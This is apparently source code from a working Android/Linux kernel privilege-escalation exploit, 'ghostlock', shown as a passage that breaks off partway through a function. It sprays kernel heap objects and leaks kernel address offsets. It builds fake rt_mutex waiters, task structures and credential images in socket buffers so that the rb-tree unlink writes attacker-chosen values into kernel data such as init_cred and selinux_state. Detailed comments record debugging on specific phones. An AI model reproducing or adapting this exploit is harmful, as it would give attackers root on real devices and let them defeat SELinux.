#include "common.h"
#include "kernel/runtime_struct_offsets.h"

#include <array>
#include <string_view>
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"
#include "kernel/target.h"
#include "kernelsnitch/kernelsnitch.h"

/* Session aliases kept from the preprocessor era: the attack statements were
 * written with these short names, and references preserve every call site
 * without the macro. */
namespace {
    auto &ks = ghostlock::session::g_exploit_session.heap.snitch;
    auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
    auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
    auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
    auto &spray_ctx = ghostlock::session::g_exploit_session.heap.spray;
    auto &pre_ctx = ghostlock::session::g_exploit_session.heap.pre;
    auto &post_ctx = ghostlock::session::g_exploit_session.heap.post;
    auto &child_leak = ghostlock::session::g_exploit_session.heap.leak_child;

    /* The skb buffer is reallocated on every prepare pass, so the pointer is
     * read at each use instead of being bound once. */
    unsigned char *skb_buf() {
        return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
    }
} // namespace

namespace ghostlock::support {
    static const profile::kernel_offsets *profile_values(void) {
        return session::g_exploit_session.profile.values();
    }

    static long long ms_since(const struct timespec *t0) {
        return static_cast<long long>(runtime_time::runtime_elapsed_ms(t0));
    }

    /* Persist stage-boundary diagnostics before a kernel panic or filesystem
     * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
    void log_sync(void) {
        fflush(stdout);
        (void) fsync(STDOUT_FILENO);
    }

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept {
        pr_error("terminal dirty race: %s errno=%d; stopping native process\n",
                 reason ? reason : "unknown", error_number);
        log_sync();
        syscall(SYS_exit_group, 70);
        __builtin_unreachable();
    }

    void read_first_line(const char *path, char *buf, size_t len) {
        if (!len) {
            return;
        }
        snprintf(buf, len, "unreadable");
        support::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
        if (!fd.valid()) {
            return;
        }
        const ssize_t n = read(fd.get(), buf, len - 1);
        const int32_t saved_errno = errno;
        fd.reset();
        if (n <= 0) {
            errno = saved_errno;
            snprintf(buf, len, "unreadable");
            return;
        }
        buf[n] = 0;
        buf[strcspn(buf, "\r\n")] = 0;
    }

    void log_startup_context(void) {
        std::array < char, 256 > attr{};
        std::array < char, 32 > enforce{};
        std::array < char, 4096 > status{};
        std::array < char, 160 > limits{};
        snprintf(limits.data(), limits.size(),
                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
        support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
        if (fd.valid()) {
            const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
            if (n > 0) {
                status[static_cast<size_t>(n)] = 0;
                const std::array<const char *, 3> names = {
                    "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"
                };
                std::array < std::array < char, 32 >, 3 > values = {
                    {
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                    }
                };
                const std::string_view status_view(status.data(), static_cast<size_t>(n));
                for (size_t i = 0; i < names.size(); i++) {
                    const size_t at = status_view.find(names[i]);
                    if (at == std::string_view::npos) continue;
                    std::string_view rest =
                            status_view.substr(at + strlen(names[i]));
                    const size_t first = rest.find_first_not_of("\t ");
                    if (first == std::string_view::npos) {
                        values[i][0] = 0;
                        continue;
                    }
                    rest.remove_prefix(first);
                    size_t len = rest.find_first_of("\r\n");
                    if (len == std::string_view::npos) len = rest.size();
                    if (len >= values[i].size()) {
                        len = values[i].size() - 1;
                    }
                    memcpy(values[i].data(), rest.data(), len);
                    values[i][len] = 0;
                }
                snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
                         "Seccomp_filters=%s", values[0].data(), values[1].data(),
                         values[2].data());
            }
        }
        struct timespec boot;
        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
        double boot_ms =
                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
                   "boot_ms=%.0f attr=%s enforce=%s\n",
                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                   attr.data(), enforce.data());
        pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
        pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
                   getpid(), kernel::BUILD_VARIANT_LABEL);
        pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
                   "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                   "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
                   getpid(), (unsigned long long) session::g_exploit_session.addresses.phys_offset,
                   (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                   (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                         session::g_exploit_session.addresses.phys_offset),
                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
                   (unsigned long long) ghostlock::profile::slide_init_task(),
                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
    }

    /* Machine state at a stage boundary: how fast the cores are actually
     * running, how hot they are, how loaded the device is, and whether the
     * spray has memory to work with.
     *
     * Why this exists: the exploit's windows are tens of milliseconds wide, and
     * the tuning constants shipped in the profile were swept on one device in
     * one thermal state. A log pulled from someone else's phone can show WHICH
     * stage failed but not whether that phone was throttled, busy, or short of
     * memory -- which is the first thing to rule out when a stage simply does
     * not land. Nothing here was observable from a remote device before.
     *
     * Called only at stage boundaries, never inside a dance. This project has
     * already lost a session to an instrument that perturbed the thing it was
     * measuring (the heavy kprobe set), so the rule is: few calls, outside the
     * window. Every field degrades to the literal "unreadable" rather than
     * being dropped, so a value the platform refuses to expose reads as
     * missing rather than as normal -- the same convention log_startup_context
     * already uses for the SELinux enforce node. */
    void log_environment(const char *tag) {
        std::array<char, 32> online{};
        std::array<char, 16> load{};
        std::array<char, 24> batt{};
        std::array<char, 16> capacity{};
        std::array<char, 2048> meminfo{};
        read_first_line("/sys/devices/system/cpu/online", online.data(), online.size());
        read_first_line("/proc/loadavg", load.data(), load.size());
        read_first_line("/sys/class/power_supply/battery/status", batt.data(), batt.size());
        read_first_line("/sys/class/power_supply/battery/capacity", capacity.data(), capacity.size());

        long total_kb = -1;
        long avail_kb = -1;
        support::UniqueFd fd(open("/proc/meminfo", O_RDONLY | O_CLOEXEC));
        if (fd.valid()) {
            const ssize_t n = read(fd.get(), meminfo.data(), meminfo.size() - 1);
            if (n > 0) {
                meminfo[static_cast<size_t>(n)] = 0;
                const char *at = strstr(meminfo.data(), "MemTotal:");
                if (at) total_kb = strtol(at + strlen("MemTotal:"), nullptr, 10);
                at = strstr(meminfo.data(), "MemAvailable:");
                if (at) avail_kb = strtol(at + strlen("MemAvailable:"), nullptr, 10);
            }
        }
        pr_info("env[%s] cpu_online=%s load=%s mem_total_kb=%ld mem_avail_kb=%ld "
                "battery=%s/%s%%\n", tag, online.data(), load.data(), total_kb,
                avail_kb, batt.data(), capacity.data());

        /* Current frequency per CPU, in kHz. The race is pinned to two cores,
         * and a throttled cluster is the leading non-obvious reason a window is
         * missed -- but the node is vendor-gated on some builds, so unreadable
         * is itself a finding. */
        char freq[256] = {};
        for (int cpu = 0; cpu < 8; cpu++) {
            std::array<char, 64> path{};
            std::array<char, 24> value{};
            snprintf(path.data(), path.size(),
                     "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_cur_freq", cpu);
            read_first_line(path.data(), value.data(), value.size());
            const size_t used = strlen(freq);
            if (used + 24 >= sizeof(freq)) break;
            snprintf(freq + used, sizeof(freq) - used, "%s%d=%s", used ? "," : "",
                     cpu, value.data());
        }
        pr_info("env[%s] freq_khz=%s\n", tag, freq);

        /* Only the zones that track the clusters the race runs on. Enumerating
         * by index instead fills the line with modem, antenna and mmwave
         * sensors -- this SoC puts them first -- and the buffer runs out before
         * reaching cpuss/gpuss, which are the ones that say whether the cores
         * were throttled. Matched by prefix because zone names differ per SoC;
         * the temperature node is only read for a zone that already matched, so
         * a non-matching zone costs one open, not two. */
        static const char *const kClusterZones[] = {
            "cpuss", "gpuss", "aoss", "cpu", "gpu", "soc", "pa"
        };
        char thermal[512] = {};
        size_t matched = 0;
        for (int zone = 0; zone < 32; zone++) {
            std::array<char, 64> path{};
            std::array<char, 48> type{};
            std::array<char, 16> temp{};
            snprintf(path.data(), path.size(),
                     "/sys/class/thermal/thermal_zone%d/type", zone);
            read_first_line(path.data(), type.data(), type.size());
            bool keep = false;
            for (const char *prefix : kClusterZones) {
                if (strncmp(type.data(), prefix, strlen(prefix)) == 0) {
                    keep = true;
                    break;
                }
            }
            if (!keep) continue;
            matched++;
            snprintf(path.data(), path.size(),
                     "/sys/class/thermal/thermal_zone%d/temp", zone);
            read_first_line(path.data(), temp.data(), temp.size());
            const size_t used = strlen(thermal);
            if (used + 64 >= sizeof(thermal)) break;
            snprintf(thermal + used, sizeof(thermal) - used, "%s%s=%s",
                     used ? "," : "", type.data(), temp.data());
        }
        pr_info("env[%s] thermal_zone_c=%s\n", tag,
                matched ? thermal : "none-matched");
    }

    void disable_rseq_for_thread(void) {
        return;
    }

    long futex_op(uint32_t *uaddr, int32_t op, uint32_t val,
                  const void *timeout_or_value, uint32_t *uaddr2,
                  uint32_t val3) {
        return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
    }

    long sched_setattr_tid(int32_t tid, int32_t nice_value) {
        kernel::local_sched_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = sizeof(attr);
        attr.sched_policy = 3; /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
        attr.sched_nice = nice_value;
        errno = 0;
        long ret = syscall(274, tid, &attr, 0);
        if (ret != 0) {
            pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
        }
        return ret;
    }

    void init_p0_profile(void) {
        pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
                (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                      session::g_exploit_session.addresses.phys_offset));
    }

    void put64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    void put32(unsigned char *p, size_t off, uint32_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
        const profile::kernel_offsets *v = profile_values();
        if (!v || !v->credential.copy_size || v->credential.copy_size > kernel::ORDER3_SIZE ||
            v->credential.usage_offset + sizeof(uint32_t) > v->credential.copy_size ||
            v->credential.caps_offset + v->credential.caps_count * sizeof(uint64_t) >
            v->credential.copy_size) {
            pr_error("credential copy profile is incomplete\n");
            return 0;
        }
        unsigned char *c = p + off;
        memset(c, 0, v->credential.copy_size);
        put32(c, v->credential.usage_offset, v->credential.usage_value);
        for (uint32_t i = 0; i < v->credential.caps_count; i++) {
            put64(c, v->credential.caps_offset + i * sizeof(uint64_t), v->credential.caps_value);
        }

        const std::array<uint32_t, 4> ref_offsets = {
            v->credential.ref0_offset, v->credential.ref1_offset,
            v->credential.ref2_offset, v->credential.ref3_offset,
        };
        const std::array<uint64_t, 4> ref_images = {
            v->credential.ref0_image, v->credential.ref1_image,
            v->credential.ref2_image, v->credential.ref3_image,
        };
        if (v->credential.ref_count > ref_offsets.size()) {
            pr_error("credential reference count %u exceeds the %zu slots\n",
                     v->credential.ref_count, ref_offsets.size());
            return 0;
        }
        for (size_t i = 0; i < v->credential.ref_count; i++) {
            if (ref_offsets[i] + sizeof(uint64_t) > v->credential.copy_size) {
                pr_error("credential reference %zu exceeds configured copy size\n", i);
                return 0;
            }
            put64(c, ref_offsets[i],
                  session::g_exploit_session.addresses.data_alias(ref_images[i]));
        }
        return 1;
    }

    pid_t clone_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            if (getppid() == 1) {
                _exit(0);
            }
            kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
            for (;;) {
                pause();
            }
        }
        return child;
    }

    pid_t clone_leak_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            ghostlock::kernelsnitch::context_find_collisions(ks);
            exit(0);
        }
        return child;
    }

    int32_t open_memfd(pid_t child) {
        std::array < char, 64 > path{};
        snprintf(path.data(), path.size(), "/proc/%d/mem", child);
        return SYSCHK(open(path.data(), O_RDONLY));
    }

    void kill_child(pid_t child) {
        if (child <= 0) {
            return;
        }
        SYSCHK(kill(child, SIGKILL));
        SYSCHK(waitpid(child, nullptr, 0));
    }

    void close_reclaim_sockets(void) {
        session::g_exploit_session.heap.current.destroy();
    }

    int32_t quarantine_reclaim_sockets(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.quarantine,
                                                               memory::PayloadPageState::Quarantined);
    }

    void release_quarantined_reclaim_sockets(void) {
        session::g_exploit_session.heap.quarantine.destroy();
    }

    Status stash_prebuilt_page(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.prebuilt,
                                                               memory::PayloadPageState::Prebuilt);
    }

    Status activate_prebuilt_page(void) {
        if (!session::g_exploit_session.heap.prebuilt.has_reclaim()) return false;
        close_reclaim_sockets();
        return session::g_exploit_session.heap.prebuilt.move_to(session::g_exploit_session.heap.current,
                                                                memory::PayloadPageState::Current);
    }

    void discard_prebuilt_page(void) {
        session::g_exploit_session.heap.prebuilt.destroy();
    }

    void cleanup_page_prepare_state(void) {
        memory::close_ctx_memfds(&prepare_ctx);
        memory::close_ctx_memfds(&spray_ctx);
        memory::close_ctx_memfds(&pre_ctx);
        memory::close_ctx_memfds(&post_ctx);
        if (session::g_exploit_session.heap.leak_memfd.get() > 0) {
            session::g_exploit_session.heap.leak_memfd.reset();
        }
        memory::free_ctx_storage(&prepare_ctx);
        memory::free_ctx_storage(&spray_ctx);
        memory::free_ctx_storage(&pre_ctx);
        memory::free_ctx_storage(&post_ctx);
        session::g_exploit_session.heap.skb_buffer.reset();
    }

    int32_t clone_memfd(void) {
        pid_t child = clone_child();
        int32_t fd = open_memfd(child);
        kill_child(child);
        return fd;
    }

    void prepare_ctxs(void) {
        prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
        prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);

        spray_ctx.childs.assign((1 + kernel::MM_PARTIALS) * mm_objs_per_slab, 0);
        spray_ctx.memfds.assign((1 + kernel::MM_PARTIALS) * mm_objs_per_slab, 0);

        pre_ctx.childs.assign(mm_objs_per_slab - 1, 0);
        pre_ctx.memfds.assign(mm_objs_per_slab - 1, 0);

        post_ctx.childs.assign(mm_objs_per_slab, 0);
        post_ctx.memfds.assign(mm_objs_per_slab, 0);
    }

    int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
        memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);

        const bool tcp_layout = route::route_capability(
            session::g_exploit_session.profile,
            [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; });
        long long payload_delta = tcp_layout ? 0 : kernel::SKB_DATA_DELTA;
        size_t chunk_bias = tcp_layout ? 0xe80 : static_cast<size_t>(kernel::SKB_FRAG_BIAS);
        size_t fake_task_off = tcp_layout ? kernel::TCP_FAKE_TASK_OFF : static_cast<size_t>(kernel::FAKE_TASK_OFF);

        uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);

        (session::g_exploit_session.heap.current.fake_lock) = payload_base + kernel::LOCK_OFF;
        (session::g_exploit_session.heap.current.fake_w0) = payload_base + kernel::W0_OFF;
        (session::g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
        uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
        uintptr_t credential_fops =
                payload_base + (tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF);
        memory::PayloadWriteLayout write_layout = payload_write_layout(
            request, base, default_fops, credential_fops,
            session::g_exploit_session.addresses.
            data_alias(session::g_exploit_session.addresses.init_cred_image_addr()));
        (session::g_exploit_session.heap.current.fake_parent) = write_layout.parent;
        (session::g_exploit_session.heap.current.fake_right) = write_layout.right;
        (session::g_exploit_session.heap.current.fake_left) = write_layout.left;
        (session::g_exploit_session.heap.current.fake_fops) = write_layout.fops;

        uintptr_t write_pc = (session::g_exploit_session.heap.current.fake_parent);
        uintptr_t write_right = (session::g_exploit_session.heap.current.fake_right);
        uintptr_t write_left = (session::g_exploit_session.heap.current.fake_left);
        /* Direct-map aliases (data_addr) resolve to the same physical pages and are
         * dereferenceable on every SoC — the tcp route already uses ghostlock::profile::slide_init_task()
         * the same way for the on-stack waiter (upstream U01-D). */
        uint64_t waiter_task = ghostlock::profile::slide_init_task();
        uint64_t task_group = ghostlock::profile::slide_root_task_group();
        uint64_t pi_top_task = ghostlock::profile::slide_init_task();

        const profile::kernel_offsets *v = profile_values();
        int32_t compact = session::g_exploit_session.profile.has_compact_waiter();

        for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
            unsigned char *p = skb_buf() + chunk + chunk_bias;

            /* LOCAL DIAGNOSTIC (not for upstream): self-locating buffer.
             * SKB_DATA_DELTA/LOCK_OFF are hardcoded upstream constants that
             * decide where these bytes land relative to the leaked page, and
             * measurement (run 21:27, `rz` mk=0) says they do not hold on
             * diting. So make the buffer say where it went: in the two regions
             * a chunk never uses, every word carries its own (chunk, offset).
             * One probe read then decodes the real mapping instead of trusting
             * the constant. Payload fields are written after this fill and
             * overwrite their own offsets, so the dance sees an intact payload.
             * Values are recognizable by their top 32 bits (0x7A5C0000|chunk).
             * See docs/analysis/payload-page-identity-plan.md. */
            const uint64_t chunk_tag = chunk / kernel::ORDER3_SIZE;
            const uint64_t fill_base = 0x7A5C000000000000ULL | (chunk_tag << 32);
            for (size_t off = 0; off < kernel::LOCK_OFF; off += sizeof(uint64_t)) {
                put64(p, off, fill_base | off);
            }
            for (size_t off = 0x2000; off < kernel::ORDER3_SIZE; off += sizeof(uint64_t)) {
                put64(p, off, fill_base | off);
            }

            put32(p, kernel::LOCK_OFF + 0x00, 0);
            /* lock->waiters.rb_root.rb_node = NULL, rb_leftmost = the page waiter.
             *
             * The ROOT must be empty. rt_mutex_enqueue() (rtmutex.c:684) re-links the
             * stack waiter with an inlined `while (*link)` descent that starts at this
             * word, and walk+0x4f4..+0x5a4 — after the dequeue's rb_erase returns and
             * before the re-link's rb_insert_color — contains no other unbounded
             * construct, which is exactly where run J2 (19:47) stopped: `re`+`rer`
             * fired, then silence, no `ri` for root = fake_lock+0x08.
             *
             * Pointing the root at the page waiter made that descent walk into a node
             * whose child slots are attacker data; empty, `*link` is 0, the loop exits
             * on its first test and rb_link_node() installs the stack waiter as the
             * root with a NULL parent, so rb_insert_color() breaks immediately on its
             * `!parent` arm. rb_leftmost must still be a valid waiter pointer: [11]
             * feeds rb_first_cached() into rt_mutex_dequeue_pi(), and a NULL there
             * would dereference it. (Build G reached this state only transiently —
             * its stack-node erase was case 1 "no children", whose __rb_change_child
             * runs with parent == NULL and so NULLs this very word.) */
            put64(p, kernel::LOCK_OFF + 0x08, 0);
            put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
            put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
            /* LOCAL DIAGNOSTIC (not for upstream): inert page marker.
             * Buffer offset LOCK_OFF + 0x80 (= 0xf00) maps to VA base + 0x80,
             * the gap between the fake rt_mutex (base + 0x00..0x20) and the
             * fops table (base + 0x100). Nothing in the dance reads or writes
             * that word, so the walk cannot rewrite it: if the `rz` probe reads
             * it back at the descent, the payload page really is the page the
             * walk is using; if it reads foreign, the buffer never landed on
             * `base`. Read with `mk=+0x78(%x1)` (x1 = base + 8).
             * See docs/analysis/payload-page-identity-plan.md. */
            put64(p, kernel::LOCK_OFF + 0x80, 0xdeadbeefcafe0000ULL | chunk_tag);

            if (compact) {
                /* Words ride the erase relink: pc = value, rb_left = dest,
                 * rb_right = 0 or the one-child arm also clobbers *(value) with
                 * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
                 * would leave the node parentless for enqueue_pi to trash
                 * fake_task. prio > 120 gates this erase. The relink's second
                 * write lands in *(value+8): cred image on W2, page rb_root at 0. */
                put64(p, kernel::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                put64(p, kernel::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                put64(p, kernel::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
                /* Page-waiter pi slot in the working CPH2521 reference's shape
                 * {pc = target-8, right = value, left = 0} (ghostlock-oneplus
                 * src/core/util.c:541, 558-560, 601-603). The 6.1 "left-only arm"
                 * {value, 0, target} that encode_compact_waiter() builds for
                 * preserve_child puts `target` — a kernel DATA address, e.g.
                 * selinux_state — into rb_left, so every inlined `while (*link)`
                 * descent and every rb_next() treats kernel data as an rb node.
                 * That is unbounded on the stack waiter (fixed by zeroing it) and
                 * on this page waiter still burned ~292 ms per walk and cost the
                 * write (run at 19:1x: no crash, "Write 1 failed").
                 * With left = 0 both walks stop at once and the erase still writes:
                 * __rb_change_child() with parent = pc = target-8 stores `right`
                 * (= the value) at *(target). The collateral store moves from
                 * *(value+8) to *(value+0) — init_cred's refcount, which the
                 * reference calls out as deliberate. */
                /* Left-only arm: its store is UNCONDITIONAL —
                 * WRITE_ONCE(rb_parent(left), pc) puts the value at *(target).
                 * The reference's {pc = target-8, right = value, left = 0} shape
                 * walks cleanly but stores through rb_change_child(), which only
                 * lands on *(target) when *(target) already equals the node; for us
                 * it went to *(target+8) and re-hung the walk (19:1x attempt 3).
                 * `left = target` is what the descents chase, so this node must be
                 * reached only by the erases below, never descended from. */
                /* The pi node carries the same triple as the route's stack stamp
                 * (waiter_tree_stamp), so whichever erase runs first performs the
                 * same write with the same collateral. */
                const memory::WaiterTreeStamp pi_stamp =
                        memory::waiter_tree_stamp(write_layout);
                put64(p, kernel::W0_OFF + 0x18, pi_stamp.pc);    /* pi pc    = value / parent */
                put64(p, kernel::W0_OFF + 0x20, pi_stamp.right); /* pi right                  */
                put64(p, kernel::W0_OFF + 0x28, pi_stamp.left);  /* pi left                   */
                put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
                /* 5.10 waiter is {tree_entry, pi_tree_entry, task, lock, int prio
                 * @0x40, u64 deadline @0x48} — there is no wake_state field (the
                 * 6.6 shape puts wake_state at 0x40 and prio at 0x44). Writing the
                 * 6.6 pair here left prio = 0, so `rt_mutex_top_waiter()` returned
                 * this page waiter (prio 0 = highest) instead of the requeued stack
                 * waiter, and the "prio > 120 gates this erase" arm never ran. */
                put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
                put32(p, kernel::W0_OFF + 0x44, 0); /* 5.10 padding before deadline */
                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
            } else {
                /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                put64(p, kernel::W0_OFF + 0x00, 1);
                put64(p, kernel::W0_OFF + 0x08, 0);
                put64(p, kernel::W0_OFF + 0x10, 0);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TASK_OFF, waiter_task);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_LOCK_OFF,
                      (session::g_exploit_session.heap.current.fake_lock));
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_WAKE_STATE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_WW_CTX_OFF, 0);
            }

            /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
            uint32_t ft_prio_off = compact
                                       ? v->task.prio
                                       : ghostlock::profile::fake_task_prio_off();
            uint32_t ft_nprio_off = compact
                                        ? v->task.normal_prio
                                        : ghostlock::profile::fake_task_normal_prio_off();
            uint32_t ft_tg_off = compact
                                     ? v->task.sched_task_group
                                     : ghostlock::profile::fake_task_task_group_off();
            uint32_t ft_pi_lock_off = compact
                                          ? v->task.pi_lock
                                          : ghostlock::profile::fake_task_pi_lock_off();
            uint32_t ft_pi_wait_off = compact
                                          ? v->task.pi_waiters
                                          : ghostlock::profile::fake_task_pi_waiters_off();
            uint32_t ft_pi_top_off = compact
                                         ? v->task.pi_top_task
                                         : ghostlock::profile::fake_task_pi_top_task_off();
            uint32_t ft_pi_blocked_off = compact
                                             ? v->task.pi_blocked_on
                                             : ghostlock::profile::fake_task_pi_blocked_on_off();

            put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
            put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_pi_lock_off, 0);
            /* pi_waiters stays EMPTY (root and leftmost both NULL).
             *
             * Pointing them at the page waiter's pi node (build I, 19:2x) hung the
             * walk: rt_mutex_dequeue_pi() erases that node but does NOT repoint the
             * root — its __rb_change_child(parent = pc = value) stores into our page,
             * not into root — so the very next rt_mutex_enqueue_pi() at [11]
             * descends from the stale root straight into the node it just erased.
             * The walker's prio (task->prio, ~120, written over ours at rtmutex.c:681)
             * is less than FAKE_WAITER_PRIO (140), so the descent takes rb_left =
             * target, and `*(target)` is the value the erase just wrote (our page
             * address) whose own rb_right holds the collateral `target` — the chase
             * walks out of our page into kernel .data and never returns.
             *
             * Empty, the enqueue links the stack waiter as the new root with no
             * descent at all, and task_has_pi_waiters() is false in the next
             * iteration, which ends the walk. */
            put64(p, fake_task_off + ft_pi_wait_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
            put64(p, fake_task_off + ft_tg_off, task_group);
            put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
            put64(p, fake_task_off + ft_pi_blocked_off, 0);

            put64(p, kernel::RIGHT_OFF + 0x00, (session::g_exploit_session.heap.current.fake_parent));
            put64(p, kernel::RIGHT_OFF + 0x08, 0);
            put64(p, kernel::RIGHT_OFF + 0x10, 0);

            put64(p, kernel::LEFT_OFF + 0x00, (session::g_exploit_session.heap.current.fake_parent));
            put64(p, kernel::LEFT_OFF + 0x08, 0);
            put64(p, kernel::LEFT_OFF + 0x10, 0);

            if (write_layout.needs_credential_copy &&
                !fill_profile_cred_copy(p, tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF)) {
                return 0;
            }
        }
        return 1;
    }

    /* TODO(CPP07-OWNER): partial prepare failure injection still needs a
     * syscall-level fault-injection framework; the ownership refactor itself is
     * complete (CPP12h). Completion: add the framework, cover the early-exit
     * paths, then delete this comment and the residual row. */
    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
        struct timespec t_spray;
        clock_gettime(CLOCK_MONOTONIC, &t_spray);
        /* Release every userspace reference from the preceding write before the
         * context arrays are replaced. Keeping the final post-spray memfd pinned
         * leaked one mm_struct per stage and progressively poisoned later sprays. */
        close_reclaim_sockets();
        cleanup_page_prepare_state();
        mm_objs_per_slab = kernel::ORDER3_SIZE /
                           session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
        prepare_ctxs();

        session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
        memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            prepare_ctx.childs[i] = clone_child();
            prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
        }

        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            spray_ctx.childs[i] = clone_child();
            spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
        }

        int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
